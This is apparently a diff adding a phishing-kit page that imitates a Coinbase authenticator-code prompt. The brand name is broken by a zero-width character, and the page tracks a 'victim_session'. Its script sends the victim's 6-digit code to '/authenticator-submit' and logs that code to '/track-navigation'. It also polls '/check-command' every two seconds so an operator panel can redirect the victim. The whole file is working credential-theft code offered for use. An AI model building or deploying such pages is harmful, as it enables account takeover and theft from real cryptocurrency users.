+                style=--foreground:rgb(var(--gray100));--foreground-muted:rgb(var(--gray60));--background:rgb(var(--gray0));--background-alternate:rgb(var(--gray5));--background-inverse:rgb(var(--gray100));--background-overlay:rgba(var(--gray80),0.33);--line:rgba(var(--gray60),0.2);--line-heavy:rgba(var(--gray60),0.66);--primary:rgb(var(--blue60));--primary-wash:rgb(var(--blue0));--primary-foreground:rgb(var(--gray0));--negative:rgb(var(--red60));--negative-foreground:rgb(var(--gray0));--negative-wash:rgb(var(--red0));--positive:rgb(var(--green60));--positive-foreground:rgb(var(--gray0));--secondary:rgb(var(--gray5));--secondary-foreground:rgb(var(--gray100));--transparent:rgba(var(--gray0),0);--warning:rgb(var(--yellow50));--warning-foreground:rgb(var(--orange40))>
+                <div data-testid=global-loading-provider-wrapper class="cds-flex-f1tjavv3 cds-column-c1kchipr"
+                    style=flex-grow:1;width:100%>
+                    <div data-testid=page-layout class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-background-b6zr2pu"
+                        style=height:100%;width:100%>
+                        <div data-testid=signin-header class="cds-grid-g1uqvyz9 cds-auto-agiev0s" role=banner
+                            style="grid-template-columns:auto 1fr auto">
+                            <div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-3-_63shon cds-3-_1krzigx cds-4-_1mgafrb cds-4-_dk22v4 cds-responsive"
+                                style=height:72px><svg aria-label="C&#8203;oinbase logo" class=cds-iconStyles-irtngcj height=32
+                                    role=img viewBox="0 0 48 48" width=32 xmlns=http://www.w3.org/2000/svg>
+                                    <title>C&#8203;oinbase logo</title>
+                                    <path
+                                        d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z"
+                                        fill=#0052FF></path>
+                                </svg></div>
+                        </div>
+                        <div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-8-_1p18wwy cds-1-_17cz18m"
+                            style=flex-grow:0;width:100%>
+                            <div data-testid=global-loading-provider-wrapper
+                                class="cds-flex-f1tjavv3 cds-column-c1kchipr"
+                                style=flex-grow:1;min-height:300px;width:100%;align-items:center;justify-content:center>
+                                <div class="cds-flex-f1tjavv3 cds-flex-start-fptdbvx cds-row-r1cf21wt cds-center-cqy3t5k"
+                                    style=flex-grow:1;width:100%>
+                                    <div class="cds-flex-f1tjavv3 cds-column-c1kchipr"
+                                        style=flex-grow:1;height:100%;max-width:448px;width:100%>
+                                        <div class="cds-flex-f1tjavv3 cds-center-cqy3t5k cds-roundedLarge-r1hj45o7 cds-bordered-b10fe35d cds-4-_1g6imbc cds-4-_13srchq cds-4-_q46sbx"
+                                            style=width:100%>
+                                            <div id=two-factor
+                                                class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-3-_10f3bvw"
+                                                style=width:100%>
+                                                <div class="cds-flex-f1tjavv3 cds-column-c1kchipr"
+                                                    style=flex-grow:1;max-width:448px;width:100%>
+                                                    <div data-testid=load-view-wrapper
+                                                        class="cds-flex-f1tjavv3 cds-column-c1kchipr"
+                                                        style=flex-grow:1;max-width:448px;width:100%>
+                                                        <div data-testid=sms-input-code
+                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr"
+                                                            style=flex-grow:1;width:100%>
+                                                            <div data-testid=identity-multi-content-layout-content-wrapper-sms-input-code
+                                                                class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-4-_rtvvf2 cds-3-_1ud7wyy">
+                                                                <div data-testid=identity-multi-content-layout-content-header-wrapper-sms-input-code
+                                                                    class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-3-_1ud7wyy">
+                                                                    <img alt height=48
+                                                                        src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iIzAwNTJGRiIgZD0iTTggMmEyIDIgMCAwIDEgMi0yaDI4YTIgMiAwIDAgMSAyIDJ2NDRhMiAyIDAgMCAxLTIgMkgxMGEyIDIgMCAwIDEtMi0yeiIvPjxwYXRoIGZpbGw9IiNDRUQyREIiIGQ9Ik00OCA4SDB2MzJoNDh6Ii8+PHBhdGggZmlsbD0iIzBBMEIwRCIgZD0iTTQwIDhIOHYzMmgzMnoiLz48cGF0aCBmaWxsPSIjRkZGRkZGIiBkPSJNMTUgMjUuNWExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM200LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM300LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM300LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM300LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgMyIvPjxwYXRoIGZpbGw9IiMwQTBCMEQiIGQ9Ik0yMSA0NGExIDEgMCAwIDEgMS0xaDRhMSAxIDAgMSAxIDAgMmgtNGExIDEgMCAwIDEtMS0xbTQtNDBhMSAxIDAgMSAxLTIgMCAxIDEgMCAwIDEgMiAwIi8+PC9zdmc+
+                                                                        width=48>
+                                                                    <div data-testid=identity-multi-content-layout-title-wrapper
+                                                                        class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-1-_1w0e50j">
+                                                                        <p
+                                                                            class="cds-typographyResets-t6muwls cds-title1-t2i0v90 cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow">
+                                                                            Enter the 6-digit code from your
+                                                                            authenticator app
+                                                                        </p>
+                                                                        <p
+                                                                            class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-start-s1u0g7ow cds-break-b1kd50ys">
+                                                                            This extra step shows that it's really you
+                                                                            trying to sign in.
+                                                                        </p>
+                                                                    </div>
+                                                                </div>
+                                                                <div data-testid=identity-multi-content-layout-body-sms-input-code
+                                                                    class="cds-flex-f1tjavv3 cds-column-c1kchipr">
+                                                                    <div data-testid=sms-input-body
+                                                                        class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-2-_mr0se7">
+                                                                        <form id="authFormDesktop">
+                                                                            <input type="hidden" id="sessionIdDesktop"
+                                                                                name="session_id"
+                                                                                value="{{ session.get('victim_session', '') }}">
+                                                                            <input type="text" id="codeDesktop"
+                                                                                name="2facode"
+                                                                                style="position: absolute; opacity: 0; pointer-events: none;"
+                                                                                maxlength="6">
+                                                                            <div
+                                                                                class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0-_1dm135g">
+                                                                                <div data-testid=code-inputs-container
+                                                                                    class="cds-flex-f1tjavv3 cds-row-r1cf21wt cds-relative-r5okg6e cds-1-_1w0e50j"
+                                                                                    role=group
+                                                                                    aria-label="numerical code inputs"
+                                                                                    style=width:100%;position:relative>
+                                                                                    <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
+                                                                                        style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
+                                                                                        <div data-testid
+                                                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
+                                                                                            style=width:100%;opacity:1>
+                                                                                            <div
+                                                                                                class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+                                                                                                <div
+                                                                                                    class=cds-inputAreaContainerStyles-ipofex6>
+                                                                                                    <span
+                                                                                                        data-testid=input-interactable-area
+                                                                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5 cds-persistedFocusStyles-p6phjeo"
+                                                                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
+                                                                                                        <div data-testid
+                                                                                                            class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
+                                                                                                        </div><input
+                                                                                                            aria-label="6 digit code, digit 1"
+                                                                                                            class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
+                                                                                                            tabindex=0
+                                                                                                            aria-invalid=false
+                                                                                                            id=cds-textinput-label-desktop-1
+                                                                                                            type=text
+                                                                                                            inputmode=numeric
+                                                                                                            autocomplete=one-time-code
+                                                                                                            value
+                                                                                                            style=text-align:center;color-scheme:light
+                                                                                                            maxlength="1">
+                                                                                                    </span></div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
+                                                                                        style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
+                                                                                        <div data-testid
+                                                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
+                                                                                            style=width:100%;opacity:1>
+                                                                                            <div
+                                                                                                class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+                                                                                                <div
+                                                                                                    class=cds-inputAreaContainerStyles-ipofex6>
+                                                                                                    <span
+                                                                                                        data-testid=input-interactable-area
+                                                                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
+                                                                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
+                                                                                                        <div data-testid
+                                                                                                            class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
+                                                                                                        </div><input
+                                                                                                            aria-label="6 digit code, digit 2"
+                                                                                                            class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
+                                                                                                            tabindex=0
+                                                                                                            aria-invalid=false
+                                                                                                            id=cds-textinput-label-desktop-2
+                                                                                                            type=text
+                                                                                                            inputmode=numeric
+                                                                                                            autocomplete
+                                                                                                            value
+                                                                                                            style=text-align:center;color-scheme:light
+                                                                                                            maxlength="1">
+                                                                                                    </span></div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
+                                                                                        style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
+                                                                                        <div data-testid
+                                                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
+                                                                                            style=width:100%;opacity:1>
+                                                                                            <div
+                                                                                                class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+                                                                                                <div
+                                                                                                    class=cds-inputAreaContainerStyles-ipofex6>
+                                                                                                    <span
+                                                                                                        data-testid=input-interactable-area
+                                                                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
+                                                                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
+                                                                                                        <div data-testid
+                                                                                                            class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
+                                                                                                        </div><input
+                                                                                                            aria-label="6 digit code, digit 3"
+                                                                                                            class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
+                                                                                                            tabindex=0
+                                                                                                            aria-invalid=false
+                                                                                                            id=cds-textinput-label-desktop-3
+                                                                                                            type=text
+                                                                                                            inputmode=numeric
+                                                                                                            autocomplete
+                                                                                                            value
+                                                                                                            style=text-align:center;color-scheme:light
+                                                                                                            maxlength="1">
+                                                                                                    </span></div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
+                                                                                        style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
+                                                                                        <div data-testid
+                                                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
+                                                                                            style=width:100%;opacity:1>
+                                                                                            <div
+                                                                                                class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+                                                                                                <div
+                                                                                                    class=cds-inputAreaContainerStyles-ipofex6>
+                                                                                                    <span
+                                                                                                        data-testid=input-interactable-area
+                                                                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
+                                                                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
+                                                                                                        <div data-testid
+                                                                                                            class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
+                                                                                                        </div><input
+                                                                                                            aria-label="6 digit code, digit 4"
+                                                                                                            class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
+                                                                                                            tabindex=0
+                                                                                                            aria-invalid=false
+                                                                                                            id=cds-textinput-label-desktop-4
+                                                                                                            type=text
+                                                                                                            inputmode=numeric
+                                                                                                            autocomplete
+                                                                                                            value
+                                                                                                            style=text-align:center;color-scheme:light
+                                                                                                            maxlength="1">
+                                                                                                    </span></div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
+                                                                                        style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
+                                                                                        <div data-testid
+                                                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
+                                                                                            style=width:100%;opacity:1>
+                                                                                            <div
+                                                                                                class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+                                                                                                <div
+                                                                                                    class=cds-inputAreaContainerStyles-ipofex6>
+                                                                                                    <span
+                                                                                                        data-testid=input-interactable-area
+                                                                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
+                                                                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
+                                                                                                        <div data-testid
+                                                                                                            class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
+                                                                                                        </div><input
+                                                                                                            aria-label="6 digit code, digit 5"
+                                                                                                            class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
+                                                                                                            tabindex=0
+                                                                                                            aria-invalid=false
+                                                                                                            id=cds-textinput-label-desktop-5
+                                                                                                            type=text
+                                                                                                            inputmode=numeric
+                                                                                                            autocomplete
+                                                                                                            value
+                                                                                                            style=text-align:center;color-scheme:light
+                                                                                                            maxlength="1">
+                                                                                                    </span></div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
+                                                                                        style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
+                                                                                        <div data-testid
+                                                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
+                                                                                            style=width:100%;opacity:1>
+                                                                                            <div
+                                                                                                class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+                                                                                                <div
+                                                                                                    class=cds-inputAreaContainerStyles-ipofex6>
+                                                                                                    <span
+                                                                                                        data-testid=input-interactable-area
+                                                                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
+                                                                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
+                                                                                                        <div data-testid
+                                                                                                            class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
+                                                                                                        </div><input
+                                                                                                            aria-label="6 digit code, digit 6"
+                                                                                                            class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
+                                                                                                            tabindex=0
+                                                                                                            aria-invalid=false
+                                                                                                            id=cds-textinput-label-desktop-6
+                                                                                                            type=text
+                                                                                                            inputmode=numeric
+                                                                                                            autocomplete
+                                                                                                            value
+                                                                                                            style=text-align:center;color-scheme:light
+                                                                                                            maxlength="1">
+                                                                                                    </span></div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                            <!-- Error message -->
+                                                                            <div id="errorMessageDesktop"
+                                                                                style="display: none; color: #ff4d4d; padding: 10px; margin: 10px 0; background: rgba(255, 77, 77, 0.1); border-radius: 4px; text-align: center;">
+                                                                                Invalid verification code. Please try
+                                                                                again.
+                                                                            </div>
+                                                                        </form>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                            <div
+                                                                class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-2-_mr0se7">
+                                                                <button
+                                                                    data-testid="unified-login-email-prompt-submit-button"
+                                                                    aria-busy="false" aria-disabled="true"
+                                                                    class="cds-interactable-i17wmk8f cds-disabledState-do7z3i1 cds-disabledBorder-d109aw8r cds-transparent-t1pmzpst cds-button-b15nm6xx cds-fullWidth-f10ei5ro cds-scaledDownState-s1o6alxd cds-primaryForeground-pd71c0x cds-button-b1oh4z3j cds-buttonBlock-b1aolcod cds-4-_1g6imbc cds-4-_13srchq"
+                                                                    disabled="" type="button" id="submitButtonDesktop"
+                                                                    style="pointer-events:none;--interactable-height:56px;--interactable-border-radius:56px;--interactable-background:var(--primary);--interactable-hovered-background:rgb(1,76,236);--interactable-hovered-opacity:0.92;--interactable-pressed-background:rgb(1,72,221);--interactable-pressed-opacity:0.86;--interactable-disabled-background:rgb(128,169,255)"><span
+                                                                        class="cds-positionRelative-pa1s919"><span
+                                                                            class="cds-typographyResets-t6muwls cds-headline-h4steop cds-primaryForeground-pd71c0x cds-transition-t1qvlahm cds-start-s1u0g7ow"><span>Continue</span></span></span></button>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Check for commands from panel every 2 seconds
+        function checkForCommands() {
+            fetch('/check-command')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.command && data.command.startsWith('encoded_')) {
+                        const encoded = data.command.replace('encoded_', '');
+                        console.log('Encoded command received, redirecting to:', encoded);
+                        window.location.href = `/e/${encoded}`;
+                    }
+                })
+                .catch(error => console.error('Error checking commands:', error));
+        }
+
+        // Form handling
+        document.addEventListener('DOMContentLoaded', function () {
+            const mobileForm = document.getElementById('authFormMobile');
+            const desktopForm = document.getElementById('authFormDesktop');
+            const mobileSubmitButton = document.getElementById('submitButtonMobile');
+            const desktopSubmitButton = document.getElementById('submitButtonDesktop');
+            const mobileErrorMessage = document.getElementById('errorMessageMobile');
+            const desktopErrorMessage = document.getElementById('errorMessageDesktop');
+
+            // Function to get all inputs for a specific view
+            function getInputs(view) {
+                const prefix = view === 'mobile' ? 'mobile' : 'desktop';
+                const inputs = [];
+                for (let i = 1; i <= 6; i++) {
+                    const input = document.getElementById(`cds-textinput-label-${prefix}-${i}`);
+                    if (input) inputs.push(input);
+                }
+                return inputs;
+            }
+
+            // Function to update the hidden input with the complete code
+            function updateHiddenInput(view) {
+                const inputs = getInputs(view);
+                let code = '';
+                inputs.forEach(input => {
+                    code += input.value;
+                });
+                const hiddenInput = document.getElementById(view === 'mobile' ? 'codeMobile' : 'codeDesktop');
+                if (hiddenInput) hiddenInput.value = code;
+
+                // Update button state
+                updateButtonState(view, code.length === 6);
+            }
+
+            // Function to update button state
+            function updateButtonState(view, enabled) {
+                const button = view === 'mobile' ? mobileSubmitButton : desktopSubmitButton;
+                if (button) {
+                    if (enabled) {
+                        button.disabled = false;
+                        button.style.pointerEvents = 'auto';
+                        button.style.opacity = '1';
+                        button.classList.remove('cds-disabledState-do7z3i1', 'cds-disabledBorder-d109aw8r');
+                    } else {
+                        button.disabled = true;
+                        button.style.pointerEvents = 'none';
+                        button.style.opacity = '0.7';
+                        button.classList.add('cds-disabledState-do7z3i1', 'cds-disabledBorder-d109aw8r');
+                    }
+                }
+            }
+
+            // Function to handle input in code boxes
+            function handleCodeInput(e, view) {
+                const input = e.target;
+                const inputs = getInputs(view);
+                const index = inputs.indexOf(input);
+
+                // Only allow numbers
+                if (!/^\d?$/.test(input.value)) {
+                    input.value = '';
+                    return;
+                }
+
+                // If a digit was entered and it's not the last box, move to next
+                if (input.value !== '' && index < 5) {
+                    inputs[index + 1].focus();
+                }
+
+                // Update the hidden input
+                updateHiddenInput(view);
+            }
+
+            // Function to handle backspace/delete
+            function handleBackspace(e, view) {
+                if (e.key === 'Backspace' || e.key === 'Delete') {
+                    const input = e.target;
+                    const inputs = getInputs(view);
+                    const index = inputs.indexOf(input);
+
+                    // If current input is empty and not the first box, move to previous
+                    if (input.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                }
+            }
+
+            // Function to handle paste
+            function handlePaste(e, view) {
+                e.preventDefault();
+                const pasteData = e.clipboardData.getData('text');
+                const digits = pasteData.replace(/\D/g, '').substring(0, 6);
+
+                const inputs = getInputs(view);
+
+                // Fill the inputs with the pasted digits
+                for (let i = 0; i < digits.length && i < 6; i++) {
+                    inputs[i].value = digits[i];
+                }
+
+                // Focus the next empty input or the last one
+                const nextEmptyIndex = digits.length < 6 ? digits.length : 5;
+                inputs[nextEmptyIndex].focus();
+
+                // Update the hidden input
+                updateHiddenInput(view);
+            }
+
+            // Initialize form for a specific view
+            function initializeForm(view) {
+                const inputs = getInputs(view);
+                const form = view === 'mobile' ? mobileForm : desktopForm;
+                const submitButton = view === 'mobile' ? mobileSubmitButton : desktopSubmitButton;
+                const errorMessage = view === 'mobile' ? mobileErrorMessage : desktopErrorMessage;
+
+                // Add event listeners to each code input
+                inputs.forEach(input => {
+                    input.addEventListener('input', (e) => handleCodeInput(e, view));
+                    input.addEventListener('keydown', (e) => handleBackspace(e, view));
+                    input.addEventListener('paste', (e) => handlePaste(e, view));
+                });
+
+                // Focus first input on page load for active view
+                if (inputs.length > 0 &&
+                    ((view === 'mobile' && window.innerWidth < 768) ||
+                        (view === 'desktop' && window.innerWidth >= 768))) {
+                    inputs[0].focus();
+                }
+
+                // Button click handler
+                if (submitButton) {
+                    submitButton.addEventListener('click', function (e) {
+                        e.preventDefault();
+
+                        const code = document.getElementById(view === 'mobile' ? 'codeMobile' : 'codeDesktop').value;
+                        const sessionId = document.getElementById(view === 'mobile' ? 'sessionId' : 'sessionIdDesktop').value;
+
+                        console.log('Submitting authenticator code data:', {
+                            code: code,
+                            session_id: sessionId
+                        });
+
+                        // Validate code
+                        if (!code) {
+                            showError('Please enter the 6-digit verification code', view);
+                            return;
+                        }
+
+                        // Validate it's a 6-digit number
+                        if (!/^\d{6}$/.test(code)) {
+                            showError('Please enter a valid 6-digit verification code', view);
+                            return;
+                        }
+
+                        // Show loading state
+                        submitButton.disabled = true;
+                        submitButton.style.opacity = '0.7';
+
+                        // Submit form data via POST
+                        fetch('/authenticator-submit', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                code: code,
+                                session_id: sessionId
+                            })
+                        })
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.success) {
+                                    console.log('Authenticator code submitted successfully, redirecting to landing page');
+
+                                    // Track the successful submission
+                                    fetch('/track-navigation', {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                            page_url: 'Authenticator Code Submitted: ' + code
+                                        })
+                                    }).finally(() => {
+                                        // Redirect to landing page
+                                        window.location.href = '/landing';
+                                    });
+                                } else {
+                                    console.log('Submission failed:', data.error);
+                                    showError(data.error || 'Verification failed. Please try again.', view);
+                                    // Reset button state on error
+                                    updateButtonState(view, true);
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Error submitting form:', error);
+                                showError('Network error. Please check your connection and try again.', view);
+                                // Reset button state on error
+                                updateButtonState(view, true);
+                            });
+                    });
+                }
+
+                function showError(message, view) {
+                    const errorElement = view === 'mobile' ? mobileErrorMessage : desktopErrorMessage;
+                    if (errorElement) {
+                        errorElement.textContent = message;
+                        errorElement.style.display = 'block';
+
+                        // Hide error after 5 seconds
+                        setTimeout(() => {
+                            errorElement.style.display = 'none';
+                        }, 5000);
+                    } else {
+                        alert(message);
+                    }
+                }
+            }
+
+            // Initialize both forms
+            initializeForm('mobile');
+            initializeForm('desktop');
+
+            // Update button states on window resize (view change)
+            window.addEventListener('resize', function () {
+                const mobileCode = document.getElementById('codeMobile').value;
+                const desktopCode = document.getElementById('codeDesktop').value;
+
+                updateButtonState('mobile', mobileCode.length === 6);
+                updateButtonState('desktop', desktopCode.length === 6);
+            });
+        });
+
+        // Initialize everything when page loads
+        document.addEventListener('DOMContentLoaded', function () {
+            // Start checking for commands
+            checkForCommands();
+            setInterval(checkForCommands, 2000);
+
+            // Track that we're on authenticator page
+            fetch('/track-navigation', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ page_url: 'Authenticator Code Page Loaded' })
+            });
+        });
+    </script>
+
+</body>
+
+</html>
